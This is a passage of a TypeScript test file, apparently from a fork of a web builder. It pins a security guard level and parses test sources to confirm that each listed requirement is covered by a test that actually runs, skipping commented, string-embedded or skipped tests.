        file: "apps/builder/app/canvas/organizeos-org-script.wiring.node.test.ts",
        path: [
          "only the insertion path and a reviewed list write raw HTML into a builder document",
        ],
      },
    ],
  },
];

/** The requirements a level names. */
const requirementsFor = (level: number): Requirement[] =>
  level >= 2 ? levelTwo : levelOne;

const present = requirementsFor(ORGANIZEOS_GUARD_LEVEL).filter(
  (requirement) => requirement.coveredBy.length > 0
);

type SyntaxNode = { type: string; [key: string]: unknown };

/** A describe, test or it call with a fixed title, and the one it is in. */
type TitledCall = {
  title: string;
  /** Marked so it may not run: skip, todo, skipIf, runIf or fails. */
  mayNotRun: boolean;
  parent: TitledCall | undefined;
};

const testFunctions = new Set(["describe", "test", "it"]);
const notRunning = new Set(["skip", "todo", "skipIf", "runIf", "fails"]);

const isNode = (value: unknown): value is SyntaxNode =>
  typeof value === "object" &&
  value !== null &&
  typeof (value as SyntaxNode).type === "string";

/** `test`, with its modifiers, for `test.skip`, `test.each(cases)` and so on. */
const calleeOf = (node: SyntaxNode) => {
  const modifiers: string[] = [];
  let current: SyntaxNode = node;
  for (;;) {
    if (current.type === "Identifier") {
      return { name: current.name as string, modifiers };
    }
    if (
      current.type === "MemberExpression" &&
      current.computed === false &&
      isNode(current.property) &&
      current.property.type === "Identifier" &&
      isNode(current.object)
    ) {
      modifiers.push(current.property.name as string);
      current = current.object;
    } else if (current.type === "CallExpression" && isNode(current.callee)) {
      current = current.callee;
    } else {
      return { name: undefined, modifiers };
    }
  }
};

const titleOf = (node: unknown) => {
  if (isNode(node) && node.type === "Literal") {
    return typeof node.value === "string" ? node.value : undefined;
  }
  // a template with no substitution is one quasi
  if (isNode(node) && node.type === "TemplateLiteral") {
    const quasis = node.quasis as Array<{ value: { cooked: string } }>;
    return quasis.length === 1 ? quasis[0].value.cooked : undefined;
  }
};

const collectCalls = (
  node: SyntaxNode,
  parent: TitledCall | undefined,
  calls: TitledCall[]
) => {
  let inner = parent;
  if (node.type === "CallExpression" && isNode(node.callee)) {
    const { name, modifiers } = calleeOf(node.callee);
    const title = titleOf((node.arguments as unknown[])[0]);
    if (name !== undefined && testFunctions.has(name) && title !== undefined) {
      inner = {
        title,
        mayNotRun: modifiers.some((modifier) => notRunning.has(modifier)),
        parent,
      };
      calls.push(inner);
    }
  }
  for (const value of Object.values(node)) {
    for (const child of Array.isArray(value) ? value : [value]) {
      if (isNode(child)) {
        collectCalls(child, inner, calls);
      }
    }
  }
};

/**
 * The titled describe, test and it calls of a test file's source. It is
 * parsed, so a title in a comment is not one.
 */
const titledCalls = async (source: string, fileName: string) => {
  const { code } = await transformWithEsbuild(source, fileName);
  const calls: TitledCall[] = [];
  collectCalls(
    parse(code, {
      ecmaVersion: "latest",
      sourceType: "module",
    }) as unknown as SyntaxNode,
    undefined,
    calls
  );
  return calls;
};

/**
 * Whether a call runs at `path`: its title is the last one, the others are
 * titles of calls it is in, in order, and neither it nor any call it is in may
 * be skipped.
 */
const runsAt = (calls: TitledCall[], path: string[]) =>
  calls.some((call) => {
    if (call.title !== path.at(-1)) {
      return false;
    }
    let wanted = path.length - 2;
    for (let current: TitledCall | undefined = call; current;) {
      if (current.mayNotRun) {
        return false;
      }
      current = current.parent;
      if (
        current !== undefined &&
        wanted >= 0 &&
        current.title === path[wanted]
      ) {
        wanted -= 1;
      }
    }
    return wanted < 0;
  });

const isCovered = async ({ file, path }: Covering) =>
  runsAt(await titledCalls(readFileSync(`${root}${file}`, "utf8"), file), path);

describe("the covering-test lookup", () => {
  const source = `
    describe("outer", () => {
      test("runs", () => {});
      // test("commented out", () => {});
      /* test("in a block comment", () => {}); */
      test.skip("skipped", () => {});
      test.todo("todo");
      it.fails("fails", () => {});
      test.each([[1]])("each %s", () => {});
      test(\`template\`, () => {});
      test(\`template \${1}\`, () => {});
      describe.skip("skipped block", () => {
        test("inside a skipped block", () => {});
      });
      describe("inner", () => {
        test.skipIf(true)("skipped if", () => {});
        it("deep", () => {});
      });
    });
    const text = 'test("in a string", () => {})';
  `;

  test("finds a title that runs, at its path, any describes between left out", async () => {
    const calls = await titledCalls(source, "lookup.test.ts");
    expect(runsAt(calls, ["runs"])).toBe(true);
    expect(runsAt(calls, ["outer", "runs"])).toBe(true);
    expect(runsAt(calls, ["outer", "inner", "deep"])).toBe(true);
    expect(runsAt(calls, ["outer", "deep"])).toBe(true);
    expect(runsAt(calls, ["outer", "each %s"])).toBe(true);
    expect(runsAt(calls, ["template"])).toBe(true);
    expect(runsAt(calls, ["inner", "outer", "deep"])).toBe(false);
    expect(runsAt(calls, ["other", "runs"])).toBe(false);
  });

  test("refuses a title in a comment or a string, and one that is skipped, todo, failing or in a skipped describe", async () => {
    const calls = await titledCalls(source, "lookup.test.ts");
    for (const title of [
      "commented out",
      "in a block comment",
      "in a string",
      "skipped",
      "todo",
      "fails",
      "skipped block",
      "inside a skipped block",
      "skipped if",
      "template 1",
    ]) {
      expect(runsAt(calls, [title]), title).toBe(false);
    }
  });
});

describe("ORGANIZEOS_GUARD_LEVEL", () => {
  // Every level-1 requirement holds and is covered, so the level is 1; a
  // change to it is a reviewed change that edits this pin.
  test("is 1, with every level-1 requirement in this repository", () => {
    expect(ORGANIZEOS_GUARD_LEVEL).toBe(1);
  });

  test("is an integer from 0 to 32767, and at most 1", () => {
    expect(Number.isInteger(ORGANIZEOS_GUARD_LEVEL)).toBe(true);
    expect(ORGANIZEOS_GUARD_LEVEL).toBeGreaterThanOrEqual(0);
    expect(ORGANIZEOS_GUARD_LEVEL).toBeLessThanOrEqual(32767);
    // no level above 1 is defined here
    expect(ORGANIZEOS_GUARD_LEVEL).toBeLessThanOrEqual(1);
  });

  test.each(
    present.map((requirement) => [requirement.name, requirement] as const)
  )("level 1: %s holds", async (_name, requirement) => {
    expect(await requirement.holds()).toBe(true);
  });

  test.each(
    present.flatMap((requirement) =>
      requirement.coveredBy.map(
        (covering) =>
          [covering.path.join(" > "), covering.file, covering] as const
      )
    )
  )("level 1 is covered by %s in %s", async (_path, _file, covering) => {
    expect(await isCovered(covering)).toBe(true);
  });

  test("a level of 1 or more means every level-1 requirement holds", async () => {
    if (ORGANIZEOS_GUARD_LEVEL >= 1) {
      for (const requirement of requirementsFor(ORGANIZEOS_GUARD_LEVEL)) {
        expect(await requirement.holds(), requirement.name).toBe(true);
        expect(requirement.coveredBy.length, requirement.name).toBeGreaterThan(
          0
        );
      }
    }
  });
});

// OrganizeOS fork: level 2 is written now and checked whatever the level is,
// so the flip (PR C) edits only the number and its pins.
describe("level 2", () => {
  test.each(
    levelTwo.map((requirement) => [requirement.name, requirement] as const)
  )(
    "every level-2 requirement already holds: %s",
    async (_name, requirement) => {
      expect(await requirement.holds()).toBe(true);
    }
  );

  test.each(
    levelTwo.flatMap((requirement) =>
      requirement.coveredBy.map(
        (covering) =>
          [covering.path.join(" > "), covering.file, covering] as const
      )
    )
  )(
    "every level-2 requirement is covered: %s in %s",
    async (_path, _file, covering) => {
      expect(await isCovered(covering)).toBe(true);
    }
  );

  test("the level-1 embed check fails with embeds on", () => {
    expect(unshippableLeftOut(true)).toBe(false);
    expect(unshippableLeftOut(false)).toBe(true);
  });

  test("level 2 keeps every level-1 requirement but the two that keep embeds off", () => {
    const names = new Set(levelTwo.map((requirement) => requirement.name));
    expect(
      levelOne
        .map((requirement) => requirement.name)
        .filter((name) => names.has(name) === false)
    ).toEqual([embedsOffName, embedsRequirementName]);
    expect(requirementsFor(1)).toBe(levelOne);
    expect(requirementsFor(2)).toBe(levelTwo);
  });
});
